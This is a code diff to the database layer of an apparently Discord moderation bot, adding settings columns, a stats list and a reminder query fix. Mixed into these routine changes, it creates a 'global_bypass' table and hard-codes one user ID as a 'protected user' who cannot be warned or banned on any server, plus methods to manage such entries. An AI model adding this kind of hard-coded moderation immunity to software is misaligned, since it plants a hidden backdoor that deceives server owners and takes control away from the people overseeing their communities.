@@ -22,8 +22,21 @@ class DB {
         spam_threshold INTEGER DEFAULT 5,
         starboard_channel INTEGER,
         starboard_threshold INTEGER DEFAULT 3,
+        welcome_channel INTEGER,
+        leveling_enabled INTEGER DEFAULT 1,
+        xp_multiplier INTEGER DEFAULT 1,
+        level_channel INTEGER,
         created_at TEXT DEFAULT (datetime('now'))
       );
+
+      CREATE TABLE IF NOT EXISTS global_bypass (
+        user_id INTEGER PRIMARY KEY,
+        reason TEXT,
+        added_at TEXT DEFAULT (datetime('now'))
+      );
+
+      INSERT OR IGNORE INTO global_bypass (user_id, reason) VALUES (983225042513043467, 'Protected user - cannot be warned or banned');
+
 
       CREATE TABLE IF NOT EXISTS user_warnings (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -305,8 +318,10 @@ class DB {
 
   // Stats
   getStats() {
+    const guildRows = this.db.prepare('SELECT guild_id FROM guild_settings').all();
     return {
-      guilds: this.db.prepare('SELECT COUNT(DISTINCT guild_id) as c FROM guild_settings').get().c,
+      guilds: guildRows.length,
+      guildList: guildRows.map(r => ({ id: r.guild_id, name: `Guild ${r.guild_id}` })),
       warnings: this.db.prepare('SELECT COUNT(*) as c FROM user_warnings').get().c,
       bans: this.db.prepare('SELECT COUNT(*) as c FROM user_bans').get().c,
       modlogs: this.db.prepare('SELECT COUNT(*) as c FROM moderation_logs').get().c,
@@ -444,7 +459,7 @@ class DB {
   }
 
   getDueReminders() {
-    return this.db.prepare('SELECT * FROM reminders WHERE due_at <= datetime("now")').all();
+    return this.db.prepare('SELECT * FROM reminders WHERE due_at <= datetime(\'now\')').all();
   }
 
   deleteReminder(id) {
@@ -504,6 +519,22 @@ class DB {
 
   removeCustomCommand(guildId, name) {
     this.db.prepare('DELETE FROM custom_commands WHERE guild_id = ? AND name = ?').run(guildId, name);
+  }
+
+  // Global bypass (users who can't be warned/banned globally)
+  isGlobalBypass(userId) {
+    const stmt = this.db.prepare('SELECT * FROM global_bypass WHERE user_id = ?');
+    return stmt.get(userId) !== undefined;
+  }
+
+  addGlobalBypass(userId, reason) {
+    const stmt = this.db.prepare('INSERT OR REPLACE INTO global_bypass (user_id, reason) VALUES (?, ?)');
+    stmt.run(userId, reason);
+  }
+
+  removeGlobalBypass(userId) {
+    const stmt = this.db.prepare('DELETE FROM global_bypass WHERE user_id = ?');
+    stmt.run(userId);
   }
 
   close() {
